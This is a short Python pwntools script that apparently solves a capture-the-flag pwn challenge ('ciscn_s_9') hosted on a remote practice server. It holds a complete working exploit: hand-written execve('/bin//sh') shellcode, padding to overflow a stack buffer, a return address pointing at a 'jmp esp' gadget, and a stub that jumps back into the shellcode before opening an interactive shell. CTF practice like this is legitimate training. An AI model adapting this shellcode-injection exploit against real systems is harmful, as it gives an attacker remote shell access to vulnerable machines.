from pwn import  *

# io = process('./ciscn_s_9')
io = remote('node4.buuoj.cn', 28185)
hint = 0x08048554 #jmp rsp

shellcode = asm('xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f;mov ebx,esp;mov al,0xb;int 0x80')

payload = shellcode.ljust(0x24, b'a') + p32(hint) + asm("sub esp,40;call esp")
io.sendline(payload)
io.interactive()


